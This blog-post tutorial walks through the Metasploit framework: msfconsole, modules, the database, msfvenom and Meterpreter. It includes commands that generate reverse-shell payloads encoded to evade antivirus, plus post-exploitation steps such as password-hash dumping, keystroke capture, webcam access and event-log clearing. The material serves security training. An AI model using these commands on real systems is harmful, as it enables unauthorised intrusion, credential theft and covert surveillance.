---
layout: post
title: "Penetration Testing with Metasploit"
date: 2024-06-25
---

## Introduction to Metasploit

Metasploit is a powerful and versatile framework used for penetration testing, security research, and vulnerability assessment. It provides tools to discover, exploit, and validate vulnerabilities in systems, making it an essential asset for security professionals.

### Metasploit Framework

The Metasploit Framework is an open-source platform that allows security experts to develop, test, and execute exploit code. It offers a comprehensive suite of tools, including exploit modules, payloads, and auxiliary modules, enabling users to simulate real-world attacks on networks and applications.

#### Main Components of the Metasploit Framework

The Metasploit Framework consists of several key components that facilitate its functionality:

1. **msfconsole**: The main command-line interface of Metasploit. It is the most commonly used interface for accessing and interacting with the Metasploit Framework. Through msfconsole, users can configure and execute exploits, payloads, and auxiliary modules.

2. **Modules**: Metasploit includes various modules that support its operations, such as:

    - **Exploits**: Code that takes advantage of vulnerabilities in systems to gain unauthorized access. Categories under exploits include:

      ```plaintext
      exploits/
      ├── aix
      ├── android
      ├── apple_ios
      ├── bsd
      ├── bsdi
      ├── dialup
      ├── example_linux_priv_esc.rb
      ├── example.py
      ├── example.rb
      ├── example_webapp.rb
      ├── firefox
      ├── freebsd
      ├── hpux
      ├── irix
      ├── linux
      ├── mainframe
      ├── multi
      ├── netware
      ├── openbsd
      ├── osx
      ├── qnx
      ├── solaris
      ├── unix
      └── windows

      20 directories, 4 files
      ```

    - **Payloads**: Code that runs after successful exploitation, providing the attacker with control over the compromised system. Payloads are categorized into adapters, singles, stagers, and stages:

      ```plaintext
      payloads/
      ├── adapters
      ├── singles
      ├── stagers
      └── stages

      4 directories, 0 files
      ```

    - **Auxiliary Modules**: A wide range of additional functionalities, including scanners, fuzzers, and denial-of-service (DoS) tools. These modules perform tasks such as scanning, crawling, and fuzzing. Categories under auxiliary modules include:

      ```plaintext
      auxiliary/
      ├── admin
      ├── analyze
      ├── bnat
      ├── client
      ├── cloud
      ├── crawler
      ├── docx
      ├── dos
      ├── example.py
      ├── example.rb
      ├── fileformat
      ├── fuzzers
      ├── gather
      ├── parser
      ├── pdf
      ├── scanner
      ├── server
      ├── sniffer
      ├── spoof
      ├── sqli
      ├── voip
      └── vsploit

      20 directories, 2 files
      ```

    - **Encoders**: Tools that encode exploits and payloads to evade signature-based antivirus detection. Categories under encoders include:

      ```plaintext
      encoders/
      ├── cmd
      ├── generic
      ├── mipsbe
      ├── mipsle
      ├── php
      ├── ppc
      ├── ruby
      ├── sparc
      ├── x64
      └── x86

      10 directories, 0 files
      ```

    - **Evasion**: Modules that attempt to evade antivirus and other security measures, with more targeted and sophisticated techniques compared to encoders. Categories under evasion include:

      ```plaintext
      evasion/
      └── windows
          ├── applocker_evasion_install_util.rb
          ├── applocker_evasion_msbuild.rb
          ├── applocker_evasion_presentationhost.rb
          ├── applocker_evasion_regasm_regsvcs.rb
          ├── applocker_evasion_workflow_compiler.rb
          ├── process_herpaderping.rb
          ├── syscall_inject.rb
          ├── windows_defender_exe.rb
          └── windows_defender_js_hta.rb

      1 directory, 9 files
      ```

    - **NOPs**: No-operation instructions used to create buffers and align payloads correctly in memory. Categories under NOPs include:

      ```plaintext
      nops/
      ├── aarch64
      ├── armle
      ├── cmd
      ├── mipsbe
      ├── php
      ├── ppc
      ├── sparc
      ├── tty
      ├── x64
      └── x86

      10 directories, 0 files
      ```

    - **Post**: Modules used in the post-exploitation phase to gather further information, maintain access, or pivot to other systems. Categories under post modules include:

      ```plaintext
      post/
      ├── aix
      ├── android
      ├── apple_ios
      ├── bsd
      ├── firefox
      ├── hardware
      ├── linux
      ├── multi
      ├── networking
      ├── osx
      ├── solaris
      └── windows

      12 directories, 0 files
      ```

3. **Tools**: Metasploit offers a set of stand-alone tools designed to assist with vulnerability research, vulnerability assessment, and penetration testing. Notable tools include:
    - **msfvenom**: A payload generator and encoder tool used to create custom payloads for use in exploits.
    - **pattern_create and pattern_offset**: Tools useful in exploit development for creating and identifying unique patterns in memory, helping to determine the offset needed for buffer overflow exploits.

### Using msfconsole

The console will be your main interface to the Metasploit Framework. You can launch it using the `msfconsole` command on any system where the Metasploit Framework is installed.

```plaintext
msfconsole
```

The `msfconsole` can be used just like a regular command-line shell.

#### Core Concepts and Examples

1. **Running Commands**

   You can execute basic Linux commands directly from the `msfconsole`. For example:

   ```plaintext
   msf6 > pwd
   [*] exec: pwd
   /home/user
   ```

   ```plaintext
   msf6 > uname -a
   [*] exec: uname -a
   Linux kernel_version #1 SMP date arch GNU/Linux
   ```

2. **Help Command**

   The `help` command can be used on its own or for a specific command. It provides useful information on how to use Metasploit commands.

   ```plaintext
   msf6 > help search
   Usage: search [keywords]
   Search for modules with a matching description, using the keyword search.
   ```

3. **History Command**

   You can use the `history` command to see commands you have typed earlier.

   ```plaintext
   msf6 > history
   1  use exploit/multi/handler
   2  set payload windows/meterpreter/reverse_tcp
   3  set lhost 192.168.1.100
   4  set lport 4444
   5  exploit
   ```

4. **Tab Completion**

   An important feature of `msfconsole` is the support of tab completion. This will come in handy when using Metasploit commands or dealing with modules. For example, if you start typing `sea` and press the tab key, it will auto-complete to `search`.

5. **Context Management**

   `msfconsole` is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. For example, if you set parameters for one exploit and then switch to another module, you will need to set those parameters again.

   ```plaintext
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   [*] No payload configured, defaulting to cmd/unix/interact
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
   ```

6. **Show Options**

   The `show options` command will display the options available for the current module context.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

   Module options (exploit/unix/ftp/vsftpd_234_backdoor):

      Name     Current Setting  Required  Description
      ----     ---------------  --------  -----------
      RHOSTS                    yes       The target address range or CIDR identifier
      RPORT    21               yes       The target port (TCP)
   ```

7. **Back Command**

   You can leave the current context using the `back` command.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
   msf6 >
   ```

8. **Info Command**

   Further information on any module can be obtained by typing the `info` command within its context.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

         Name: VSFTPD v2.3.4 Backdoor Command Execution
       Module: exploit/unix/ftp/vsftpd_234_backdoor
     Platform: Unix
         Arch: 
     Privileged: Yes
      License: Metasploit Framework License (BSD)
         Rank: Excellent
    Disclosed: 2011-07-03

   Provided by:
     H D Moore

   Available targets:
     Id  Name
     --  ----
     0   Automatic

   Basic options:
     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     RHOSTS                    yes       The target address range or CIDR identifier
     RPORT    21               yes       The target port (TCP)

   Payload information:
     Space: 2000

   Description:
     This module exploits a malicious backdoor that was added to the
     VSFTPD download archive. This backdoor was introduced into the
     vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st
     2011 according to the most recent information available. The
     backdoor was removed on July 3rd 2011.

   References:
     https://security.appspot.com/vsftpd.txt
     https://cvedetails.com/cve/CVE-2011-2523/
   ```

9. **Search Command**

   The `search` command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names, or target systems.

   ```plaintext
   msf6 > search vsftpd

   Matching Modules
   =================

      #  Name                                 Disclosure Date  Rank       Check  Description
      -  ----                                 ---------------  ----       -----  -----------
      0  exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
   ```

   You can use specific filters with the search command to narrow down the results. For example, you can search by type or platform.

   ```plaintext
   msf6 > search type:exploit platform:windows

   Matching Modules
   =================

      #  Name                                       Disclosure Date  Rank       Check  Description
      -  ----                                       ---------------  ----       -----  -----------
      0  exploit/windows/smb/ms17_010_eternalblue   2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
      1  exploit/windows/http/struts2_content_type  2017-07-07       excellent  Yes    Apache Struts Content-Type Remote Code Execution
      2  exploit/windows/rdp/cve_2019_0708_bluekeep 2019-05-14       critical   Yes    BlueKeep Remote Desktop Protocol (RDP) Remote Windows Kernel Use After Free
   ```

### Working with Modules

To work effectively with Metasploit modules, follow these core concepts and examples. Any Metasploit version 5 or 6 will have menus and screens similar to those shown here.

#### Entering Module Context

Once you have entered the context of a module using the `use` command followed by the module name, you will need to set parameters. Use the `show options` command to list the required parameters.

```plaintext
use exploit/linux/http/apache_mod_cgi_bash_env_exec
show options
```

#### Setting Parameters

Set parameters using the `set` command:

```plaintext
set RHOSTS 192.168.1.10
set RPORT 8080
```

#### Common Parameters

- **RHOSTS**: Target IP address or range.
- **RPORT**: Target application port.
- **PAYLOAD**: Payload to use with the exploit.
- **LHOST**: Attacking machine IP address.
- **LPORT**: Port for the reverse shell.

#### Global Parameters

Use `setg` to set global values for all modules:

```plaintext
setg RHOSTS 192.168.1.10
```

#### Clearing Parameters

Clear parameters using `unset` or `unset all`:

```plaintext
unset RHOSTS
unset all
```

#### Running Modules

Launch the module using `exploit` or `run`:

```plaintext
exploit
```

Background the session with `-z`:

```plaintext
exploit -z
```

#### Sessions

List active sessions:

```plaintext
sessions
```

Interact with a session:

```plaintext
sessions -i 1
```

Background a session:

```plaintext
meterpreter > background
```

### The Metasploit Database

The Metasploit database is an essential component for managing and storing information about hosts, services, vulnerabilities, and more. Using the database, you can efficiently track and analyze your penetration testing activities.

#### Setting Up the Database

First, you need to initialize and connect to the database. This can be done using the following commands:

```plaintext
msf6 > db_init
```

To verify the connection to the database, use:

```plaintext
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

#### Core Concepts

1. **Hosts and Services:**
   The database stores information about discovered hosts and their services. This helps in keeping track of the network landscape during an assessment.

   ```plaintext
   msf6 > db_nmap 192.168.1.0/24
   msf6 > hosts
   ```

2. **Vulnerabilities:**
   You can log discovered vulnerabilities into the database. This provides a centralized place to review and manage them.

   ```plaintext
   msf6 > vulns
   ```

3. **Loot:**
   Any valuable information gathered during a penetration test can be stored in the database as loot.

   ```plaintext
   msf6 > loot
   ```

#### Examples

- **Adding Hosts:**
  Manually add a host to the database:

  ```plaintext
  msf6 > db_add_host 192.168.1.100
  ```

- **Listing Services:**
  View services discovered on the hosts:

  ```plaintext
  msf6 > services
  ```

- **Finding Vulnerabilities:**
  Search for vulnerabilities in the database:

  ```plaintext
  msf6 > vulns -h
  ```

- **Storing Loot:**
  Save collected data for future reference:

  ```plaintext
  msf6 > db_loot
  ```

### Msfvenom

`msfvenom` is a powerful standalone tool for generating and encoding payloads used in exploits. It combines the functionalities of `msfpayload` and `msfencode` into a single utility, making it easier to create custom payloads for various attack scenarios.

#### Core Concepts

1. **Payloads:**
   These are the code that runs on the target system after exploitation. `msfvenom` allows you to generate payloads for various platforms and architectures.

2. **Encoders:**
   Encoders are used to encode payloads to avoid detection by antivirus software. `msfvenom` supports multiple encoders to help obfuscate your payloads.

3. **Formats:**
   Payloads can be output in various formats, such as executables, scripts, and shellcode. This flexibility allows you to use `msfvenom` payloads in different attack vectors.

#### Basic Usage

The basic syntax for using `msfvenom` is:

```plaintext
msfvenom -p PAYLOAD OPTIONS -e ENCODER -f FORMAT -o OUTPUT_FILE
```

#### Examples

1. **Generating a Reverse TCP Shell:**

   Generate a Windows reverse TCP shell payload:

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
   ```

2. **Encoding a Payload:**

   Encode the payload with the `shikata_ga_nai` encoder:

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
   ```

3. **Generating Shellcode:**

   Generate shellcode for a Linux payload:

   ```plaintext
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -o shellcode.c
   ```

4. **Creating a PHP Payload:**

   Create a PHP reverse shell payload:

   ```plaintext
   msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
   ```

#### Practical Workflow

1. **Select Payload:**
   Choose the appropriate payload for your target system and scenario.

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444
   ```

2. **Choose Encoder (if needed):**
   Encode the payload to avoid detection.

   ```plaintext
   -e x86/shikata_ga_nai -i 5
   ```

3. **Specify Output Format:**
   Define the format for the payload.

   ```plaintext
   -f exe -o shell.exe
   ```

4. **Generate Payload:**
   Execute the `msfvenom` command to generate the payload.

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
   ```

#### Output Formats

`msfvenom` supports various output formats, including:

- **Executable:** `-f exe`
- **Raw Shellcode:** `-f raw`
- **C Code:** `-f c`
- **PHP:** `-f raw` (typically used for web payloads)
- **Python:** `-f python`

Understanding and using `msfvenom` effectively allows you to create tailored payloads that can evade detection and fit into different exploit scenarios.

### Meterpreter

Meterpreter is an advanced and extensible payload within the Metasploit Framework that provides a powerful way to interact with the target system post-exploitation. It operates in memory, making it stealthy and difficult to detect. Here, we cover the core concepts of Meterpreter, its various flavors, and examples of its powerful commands.

#### Meterpreter Flavors

Meterpreter payloads are divided into two main categories: staged and inline.

- **Staged Payloads:** Sent to the target in two steps. The initial part (the stager) establishes a connection and downloads the rest of the payload. This allows for a smaller initial payload size.
- **Inline Payloads:** Sent in a single step. The entire payload is delivered and executed at once.

The choice of Meterpreter payload depends on:

1. **Target Operating System:** Linux, Windows, Mac, Android, etc.
2. **Components Available on Target System:** Python, PHP, etc.
3. **Network Connection Types:** Raw TCP, HTTPS reverse connection, IPv6, etc.

#### Meterpreter Commands

Meterpreter provides a wide range of built-in commands categorized into core commands, file system commands, networking commands, and more. Each version of Meterpreter (e.g., Windows, Linux) has different command options. Running the `help` command within a Meterpreter session lists all available commands for that version.

##### Core Commands

- **help:** Lists all available commands.

  ```plaintext
  meterpreter > help
  ```

- **getuid:** Displays the user with which Meterpreter is currently running.

  ```plaintext
  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  ```

- **ps:** Lists running processes, useful for identifying targets for process migration.

  ```plaintext
  meterpreter > ps
  ```

- **migrate:** Migrates Meterpreter to another process, which can help stabilize the session or capture keystrokes.

  ```plaintext
  meterpreter > migrate 1234
  ```

##### Examples of Useful Commands

1. **Hashdump:**
   Dumps the contents of the SAM database, displaying password hashes stored on a Windows system.

   ```plaintext
   meterpreter > hashdump
   ```

2. **Search:**
   Searches for files with specific names or patterns, useful for locating sensitive information quickly.

   ```plaintext
   meterpreter > search -f *.txt
   ```

3. **Shell:**
   Launches a regular command-line shell on the target system.

   ```plaintext
   meterpreter > shell
   ```

##### Practical Workflow

1. **Getting User ID:**

   ```plaintext
   meterpreter > getuid
   Server username: NT AUTHORITY\SYSTEM
   ```

2. **Listing Processes:**

   ```plaintext
   meterpreter > ps
   ```

3. **Migrating to Another Process:**

   ```plaintext
   meterpreter > migrate 1234
   [*] Migrating from 5678 to 1234...
   [*] Migration completed successfully.
   ```

4. **Dumping Password Hashes:**

   ```plaintext
   meterpreter > hashdump
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   ```

5. **Searching for Files:**

   ```plaintext
   meterpreter > search -f confidential.txt
   Found 1 result...
     c:\Users\Public\Documents\confidential.txt
   ```

6. **Launching a Shell:**

   ```plaintext
   meterpreter > shell
   Microsoft Windows [Version 10.0.19042.1052]
   C:\Windows\system32>
   ```

### Built-in Commands Categories

1. **Core Commands:** Basic commands for interacting with Meterpreter.
2. **File System Commands:** Commands for navigating and manipulating the file system.
3. **Networking Commands:** Commands for network-related tasks.
4. **System Commands:** Commands for gathering system information and performing system-level operations.
5. **User Interface Commands:** Commands for interacting with the graphical user interface.
6. **Webcam Commands:** Commands for accessing the webcam.
7. **Audio Output Commands:** Commands for capturing audio output.
8. **Elevate Commands:** Commands for privilege escalation.
9. **Password Database Commands:** Commands for accessing password databases.
10. **Timestomp Commands:** Commands for manipulating file timestamps.

## Glossary

Below is a comprehensive list of Meterpreter commands and their descriptions.

| Command                           | Description                                                              |
|-----------------------------------|--------------------------------------------------------------------------|
| **Core Commands**                 |                                                                          |
| `background`                      | Backgrounds the current session                                          |
| `exit`                            | Terminates the Meterpreter session                                       |
| `guid`                            | Gets the session GUID (Globally Unique Identifier)                       |
| `help`                            | Displays the help menu                                                   |
| `info`                            | Displays information about a Post module                                 |
| `irb`                             | Opens an interactive Ruby shell on the current session                   |
| `load`                            | Loads one or more Meterpreter extensions                                 |
| `migrate`                         | Allows you to migrate Meterpreter to another process                     |
| `run`                             | Executes a Meterpreter script or Post module                             |
| `sessions`                        | Quickly switch to another session                                        |
| **File System Commands**          |                                                                          |
| `cd`                              | Changes directory                                                       |
| `ls`                              | Lists files in the current directory (dir will also work)                |
| `pwd`                             | Prints the current working directory                                     |
| `edit`                            | Allows you to edit a file                                                |
| `cat`                             | Displays the contents of a file to the screen                            |
| `rm`                              | Deletes the specified file                                               |
| `search`                          | Searches for files                                                       |
| `upload`                          | Uploads a file or directory                                              |
| `download`                        | Downloads a file or directory                                            |
| **Networking Commands**           |                                                                          |
| `arp`                             | Displays the host ARP (Address Resolution Protocol) cache                |
| `ifconfig`                        | Displays network interfaces available on the target system               |
| `netstat`                         | Displays the network connections                                         |
| `portfwd`                         | Forwards a local port to a remote service                                |
| `route`                           | Allows you to view and modify the routing table                          |
| **System Commands**               |                                                                          |
| `clearev`                         | Clears the event logs                                                    |
| `execute`                         | Executes a command                                                       |
| `getpid`                          | Shows the current process identifier                                     |
| `getuid`                          | Shows the user that Meterpreter is running as                            |
| `kill`                            | Terminates a process                                                     |
| `pkill`                           | Terminates processes by name                                             |
| `ps`                              | Lists running processes                                                  |
| `reboot`                          | Reboots the remote computer                                              |
| `shell`                           | Drops into a system command shell                                        |
| `shutdown`                        | Shuts down the remote computer                                           |
| `sysinfo`                         | Gets information about the remote system, such as OS                     |
| **Other Commands**                |                                                                          |
| `idletime`                        | Returns the number of seconds the remote user has been idle              |
| `keyscan_dump`                    | Dumps the keystroke buffer                                               |
| `keyscan_start`                   | Starts capturing keystrokes                                              |
| `keyscan_stop`                    | Stops capturing keystrokes                                               |
| `screenshare`                     | Allows you to watch the remote user's desktop in real time               |
| `screenshot`                      | Grabs a screenshot of the interactive desktop                            |
| `record_mic`                      | Records audio from the default microphone for X seconds                  |
| `webcam_chat`                     | Starts a video chat                                                      |
| `webcam_list`                     | Lists webcams                                                            |
| `webcam_snap`                     | Takes a snapshot from the specified webcam                               |
| `webcam_stream`                   | Plays a video stream from the specified webcam                           |
| `getsystem`                       | Attempts to elevate your privilege to that of local system               |
| `hashdump`                        | Dumps the contents of the SAM database                                   |

### Disclaimer

**Legal Considerations:** Always ensure you have permission to perform pentesting on the network you are targeting to avoid violating legal or ethical boundaries.
